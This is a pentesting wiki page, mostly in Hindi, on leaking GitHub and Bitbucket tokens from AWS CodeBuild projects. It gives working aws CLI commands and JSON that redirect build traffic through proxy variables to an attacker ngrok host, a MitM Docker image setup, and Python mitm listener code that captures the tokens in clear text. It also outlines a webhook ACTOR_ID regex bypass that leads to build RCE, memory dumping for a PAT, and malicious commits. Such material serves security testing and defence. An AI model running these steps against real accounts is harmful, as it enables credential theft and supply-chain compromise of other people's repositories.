# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Github/Bitbucket के कॉन्फ़िगर किए गए Tokens पुनर्प्राप्त करें

सबसे पहले, जांचें कि क्या कोई source credentials कॉन्फ़िगर किए गए हैं जिन्हें आप leak कर सकते हैं:
```bash
aws codebuild list-source-credentials
```
### Docker Image के माध्यम से

यदि आपको पता चले कि उदाहरण के लिए Github के लिए authentication उस account में सेट है, तो आप वह **access** (**GH token or OAuth token**) **exfiltrate** कर सकते हैं, Codebuild को प्रोजेक्ट के build चलाने के लिए एक specific Docker image इस्तेमाल करने पर मजबूर करके।

इसके लिए आप **नया Codebuild project बना सकते हैं** या एक मौजूदा का **environment** बदलकर **Docker image** सेट कर सकते हैं।

The Docker image you could use is [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). यह एक बहुत basic Docker image है जो **env variables `https_proxy`**, **`http_proxy`** और **`SSL_CERT_FILE`** सेट करेगा। इससे आप उस होस्ट के अधिकांश ट्रैफ़िक को intercept कर पाएँगे जो **`https_proxy`** और **`http_proxy`** में संकेतित है, और उस SSL CERT पर भरोसा करेगा जो **`SSL_CERT_FILE`** में संकेतित है।

1. **अपना Docker MitM image बनाएं और अपलोड करें**
- repo के निर्देशों का पालन करके अपना proxy IP address और SSL cert सेट करें और **docker image build** करें।
- **DO NOT SET `http_proxy`** ताकि metadata endpoint के अनुरोधों को intercept न किया जाए।
- आप **`ngrok`** का उपयोग कर सकते हैं, जैसे `ngrok tcp 4444`, अपने host पर proxy सेट करने के लिए
- एक बार जब आपका Docker image build हो जाए, तो **इसे किसी public repo में upload करें** (Dockerhub, ECR...)
2. **Environment सेट करें**
- एक **नया Codebuild project** बनाएं या मौजूदा एक के environment को **modify** करें।
- प्रोजेक्ट को सेट करें कि वह **previously generated Docker image** का उपयोग करे

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **अपने host में MitM proxy सेट करें**

- जैसा कि **Github repo** में दर्शाया गया है, आप कुछ ऐसा उपयोग कर सकते हैं:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> उपयोग की गई **mitmproxy version 9.0.1** थी; रिपोर्ट्स के अनुसार version 10 पर यह काम नहीं कर सकता है।

4. **बिल्ड चलाएँ & capture the credentials**

- आप token को **Authorization** header में देख सकते हैं:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

यह aws cli से भी कुछ इस तरह किया जा सकता है
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### insecureSSL के माध्यम से

**Codebuild** projects में **`insecureSsl`** नाम की एक setting होती है जो वेब में छिपी रहती है, आप इसे केवल API से ही बदल सकते हैं.\
इसे सक्षम करने पर, Codebuild platform द्वारा प्रदान किए गए repository से **certificate की जाँच किए बिना** जुड़ सकता है.

- सबसे पहले आपको current configuration को enumerate करना होगा, कुछ इस तरह:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- फिर, एकत्रित जानकारी के साथ आप प्रोजेक्ट सेटिंग **`insecureSsl`** को **`True`** में अपडेट कर सकते हैं। नीचे मेरे द्वारा एक प्रोजेक्ट अपडेट करने का उदाहरण है, ध्यान दें कि अंत में **`insecureSsl=True`** है (यह ही एक चीज़ है जिसे आपको एकत्रित कॉन्फ़िगरेशन में बदलना है)।
- इसके अलावा, अपने tcp ngrok की ओर इशारा करते हुए env variables **http_proxy** और **https_proxy** भी जोड़ें, जैसे:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- फिर, proxy variables (http_proxy and https_proxy) द्वारा इंगित पोर्ट पर [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) से बेसिक उदाहरण चलाएँ
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- अंत में, **Build the project** पर क्लिक करें, ये **credentials** mitm पोर्ट पर **clear text** (base64) में भेज दिए जाएंगे:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~HTTP प्रोटोकॉल के माध्यम से~~

> [!TIP] > **यह vulnerability AWS द्वारा 20th of Feb of 2023 के सप्ताह में किसी बिंदु पर ठीक कर दी गई थी (मुझे लगता है शुक्रवार)। इसलिए एक attacker अब इसका दुरुपयोग नहीं कर सकता :)**

एक attacker जिसके पास CodeBuild पर elevated permissions हों, वह configured Github/Bitbucket token को leak कर सकता है, या यदि permissions OAuth के माध्यम से configured थे, तो code तक पहुँचने के लिए उपयोग किया गया temporary OAuth token भी।

- एक attacker CodeBuild project में environment variables **http_proxy** और **https_proxy** जोड़ सकता है जो उसकी मशीन की ओर point करते हैं (उदाहरण के लिए `http://5.tcp.eu.ngrok.io:14972`)।

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- फिर, github repo का URL HTTPS की बजाय HTTP उपयोग करने के लिए बदलें, उदाहरण के लिए: `http://github.com/carlospolop-forks/TestActions`
- फिर, proxy variables (http_proxy और https_proxy) द्वारा point किए गए पोर्ट में [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) से basic example चलाएँ।
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- इसके बाद, **प्रोजेक्ट बिल्ड करें** पर क्लिक करें या कमांड लाइन से बिल्ड शुरू करें:
```sh
aws codebuild start-build --project-name <proj-name>
```
- अंत में, **credentials** को **साफ़ टेक्स्ट** (base64) में mitm पोर्ट पर भेजा जाएगा:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> अब एक attacker अपनी मशीन से token का उपयोग कर सकेगा, इसके सभी privileges को सूचीबद्ध कर सकेगा और सीधे CodeBuild सेवा का उपयोग करने की तुलना में इसका (ab)use/दुरुपयोग करना आसान होगा।

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

गलत कॉन्फ़िगर किए गए CodeBuild GitHub webhooks जो unanchored `ACTOR_ID` regexes का उपयोग करते हैं, *untrusted* PRs को privileged builds शुरू करने की अनुमति देते हैं। यदि allowlist `123456|7890123` जैसा है और उसमें `^`/`$` नहीं है, तो कोई भी ID जिसमें उन substrings में से कोई भी शामिल हो, मेल खाता है। क्योंकि GitHub user IDs अनुक्रमिक होते हैं, एक attacker "eclipsing" ID (trusted ID का एक superstring) रजिस्टर करने के लिए रेस कर सकता है और build ट्रिगर कर सकता है।

**Exploit path**

1. सार्वजनिक CodeBuild projects खोजें जो webhook filters उजागर करते हैं और एक unanchored `ACTOR_ID` allowlist निकालें।
2. एक eclipsing GitHub ID प्राप्त करें:
- GitHub orgs बनाकर/हटाकर global ID counter का नमूना लें (org IDs pool साझा करते हैं)।
- कई GitHub App manifest creations को pre-stage करें और जब counter लक्ष्य के लगभग ~100 IDs के भीतर हो तब confirmation URLs को सक्रिय करके burst-register करें एक bot ID जिसमें trusted substring हो।
3. eclipsing account से एक PR खोलें; regex substring से मेल खाता है और privileged build चल जाता है।
4. build RCE का उपयोग करें (उदा., dependency install hooks) ताकि process memory dump कर सकें जो GitHub credential को handle कर रही है और PAT/OAuth token पुनः प्राप्त करें।
5. `repo` scope वाले token के साथ, अपने account को collaborator/admin के रूप में invite करें और malicious commits को push/approve करें या secrets को exfiltrate करें।

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
